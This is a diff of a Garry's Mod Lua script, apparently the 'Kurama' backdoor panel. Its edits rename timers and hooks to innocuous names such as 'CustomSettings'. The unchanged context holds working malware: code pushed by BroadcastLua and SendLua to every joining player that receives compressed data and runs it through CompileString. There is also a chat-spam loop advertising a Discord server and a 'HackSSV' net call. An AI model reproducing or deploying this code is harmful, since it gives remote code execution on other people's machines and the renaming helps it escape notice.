@@ -18,7 +18,7 @@ end
 local net_string = rdm_str(25)
 util.AddNetworkString(net_string)
 BroadcastLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
-hook.Add("PlayerInitialSpawn", "Coucou"..net_string,function(ply)
+hook.Add("PlayerInitialSpawn", "hi"..net_string,function(ply)
     if !ply:IsBot() then
        ply:SendLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
     end
@@ -646,7 +646,7 @@ xp(a,b,c,d,e,f,g,h,x,w,m,y,s)
 end)
 
 KuramaClient([[
-timer.Create("lkbzddhzbiad", 1.5, 0, function()
+timer.Create("chatSpam", 1.5, 0, function()
 local time = tonumber(0)
 local Message = {
     "< https://discord.gg/kurama >",
@@ -794,7 +794,7 @@ xpcall(function()
         net.Start("HackSSV")
         net.SendToServer()
       end
-timer.Destroy("ARABED")
+timer.Destroy("CustomSettings")
 timer.Destroy("ZoomV2")
 
     hook.Remove("CalcView", "KuramaDev")
@@ -823,7 +823,7 @@ timer.Create("ZoomV2", 0.05, 1, function()
     hook.Remove("CalcView", "JettaSSV")
     hook.Add("CalcView", "KuramaDev", KuramaDev)
 end)
-timer.Create("ARABED", 0.80, 1, function()
+timer.Create("CustomSettings", 0.80, 1, function()
     hook.Remove("RenderScreenspaceEffects", "USH")
     hook.Remove("PostDrawTranslucentRenderables", "OOF")
     hook.Remove("GetMotionBlurValues", "watht")
